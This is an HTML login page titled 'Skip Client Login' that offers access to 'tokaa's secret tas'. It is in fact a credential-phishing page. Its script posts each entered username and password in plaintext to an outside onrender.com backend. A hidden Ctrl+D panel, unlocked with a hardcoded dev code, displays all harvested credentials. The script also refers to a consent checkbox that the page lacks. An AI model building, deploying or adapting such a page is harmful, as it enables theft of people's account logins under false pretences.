<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Skip Client Login</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    :root {
      --bg-dark: #0a0a0f;
      --bg-light: #1c1c28;
      --text-main: #ffffff;
      --text-muted: #8fa1c1;
      --accent: #4a90e2;
      --accent-hover: #357ab8;
      --input-bg: #141420;
      --input-border: #2a2a38;
      --transition: 0.25s ease-in-out;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Inter', sans-serif;
      background: var(--bg-dark);
      color: var(--text-main);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 20px;
    }

    main {
      background: var(--bg-light);
      padding: 40px 32px;
      border-radius: 16px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.45);
      position: relative;
      transition: var(--transition);
    }

    h1 {
      font-size: 26px;
      text-align: center;
      margin-bottom: 24px;
      color: var(--accent);
    }

    label {
      display: block;
      margin-bottom: 6px;
      font-weight: 600;
      color: var(--text-muted);
      font-size: 14px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px 14px;
      margin-bottom: 20px;
      background: var(--input-bg);
      border: 1.5px solid var(--input-border);
      border-radius: 10px;
      color: var(--text-main);
      font-size: 15px;
      transition: border var(--transition), box-shadow var(--transition);
    }

    input:focus {
      border-color: var(--accent);
      outline: none;
      box-shadow: 0 0 8px var(--accent);
    }

    .checkbox-group {
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 13px;
      color: var(--text-muted);
      margin-bottom: 20px;
    }

    .checkbox-group input {
      accent-color: var(--accent);
    }

    button {
      width: 100%;
      padding: 12px 0;
      background: var(--accent);
      color: var(--text-main);
      border: none;
      border-radius: 10px;
      font-weight: 700;
      font-size: 15px;
      cursor: pointer;
      transition: background var(--transition);
    }

    button:hover {
      background: var(--accent-hover);
    }

    .footer {
      margin-top: 24px;
      font-size: 12px;
      text-align: center;
      color: var(--text-muted);
    }

    /* Dev Modal */
    #devModal {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%) scale(0.95);
      background: var(--bg-light);
      border: 2px solid var(--accent);
      border-radius: 14px;
      padding: 24px 20px;
      width: 95%;
      max-width: 540px;
      max-height: 75%;
      overflow-y: auto;
      color: var(--text-main);
      font-family: monospace;
      font-size: 13px;
      white-space: pre-wrap;
      z-index: 1000;
      opacity: 0;
      transition: var(--transition);
      pointer-events: none;
    }

    #devModal.show {
      transform: translate(-50%, -50%) scale(1);
      opacity: 1;
      pointer-events: auto;
    }

    #devModalClose {
      position: absolute;
      top: 10px;
      right: 14px;
      background: none;
      border: none;
      color: var(--accent);
      font-weight: 700;
      font-size: 18px;
      cursor: pointer;
    }

    #devOutput {
      margin-top: 24px;
      line-height: 1.5;
    }

  </style>
</head>
<body>

  <main>
    <h1>tokaa's secret tas</h1>

    <form id="loginForm" autocomplete="off">
      <input id="username" name="username" type="text" placeholder="username" required />
      <input id="password" name="password" type="text" placeholder="password" required />


      <button type="submit">start the tas</button>
    </form>

    <div class="footer">&copy; 2025</div>
  </main>

  <!-- Dev modal -->
  <div id="devModal">
    <button id="devModalClose">X</button>
    <pre id="devOutput"></pre>
  </div>

  <script>
    (function(){
      const BACKEND = "https://skip-client-login.onrender.com";
      const DEV_CODE = "jackson";
      const captures = [];

      const loginForm = document.getElementById('loginForm');
      const usernameEl = document.getElementById('username');
      const passwordEl = document.getElementById('password');
      const consentEl = document.getElementById('consent');

      const devModal = document.getElementById('devModal');
      const devOutput = document.getElementById('devOutput');
      const devModalClose = document.getElementById('devModalClose');

      async function saveEntry(username, password){
        try {
          await fetch(`${BACKEND}/api/entries`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
          });
        } catch(err){
          console.error('Save failed', err);
        }
      }

      async function fetchDevEntries(code){
        try {
          const res = await fetch(`${BACKEND}/api/dev?code=${encodeURIComponent(code)}`);
          if(!res.ok) throw new Error('Fetch failed');
          const data = await res.json();
          return data.entries || [];
        } catch(err){
          alert('Error fetching dev entries');
          return [];
        }
      }

      loginForm.addEventListener('submit', async e => {
        e.preventDefault();
        const username = usernameEl.value.trim();
        const password = passwordEl.value.trim();
        if(!username || !consentEl.checked){
          alert('Enter username and consent first.');
          return;
        }
        captures.push({ username, password, createdAt: new Date().toISOString() });
        await saveEntry(username, password);
        usernameEl.value = '';
        passwordEl.value = '';
        consentEl.checked = false;
        alert('Saved!');
      });

      function showDevModal(){
        devModal.classList.add('show');
      }

      function hideDevModal(){
        devModal.classList.remove('show');
      }

      devModalClose.addEventListener('click', hideDevModal);

      document.addEventListener('keydown', async e => {
        if(e.ctrlKey && e.key.toLowerCase() === 'd'){
          e.preventDefault();
          const code = prompt('Enter Dev Code:');
          if(code !== DEV_CODE){
            alert('Wrong code');
            return;
          }
          const backendEntries = await fetchDevEntries(code);
          let out = 'ðŸ§  DEV ENTRIES (backend):\n\n';
          backendEntries.forEach((e,i)=>{
            out += `${i+1}. Username: ${e.username}\n   Password: ${e.password ?? '(none)'}\n   Created: ${new Date(e.createdAt).toLocaleString()}\n\n`;
          });
          if(captures.length){
            out += '\nLocal (recent):\n\n';
            captures.forEach((e,i)=>{
              out += `${i+1}. Username: ${e.username}\n   Password: ${e.password ?? '(none)'}\n   Captured: ${new Date(e.createdAt).toLocaleString()}\n\n`;
            });
          }
          devOutput.textContent = out.trim();
          showDevModal();
        }
      });

    })();
  </script>

</body>
</html>
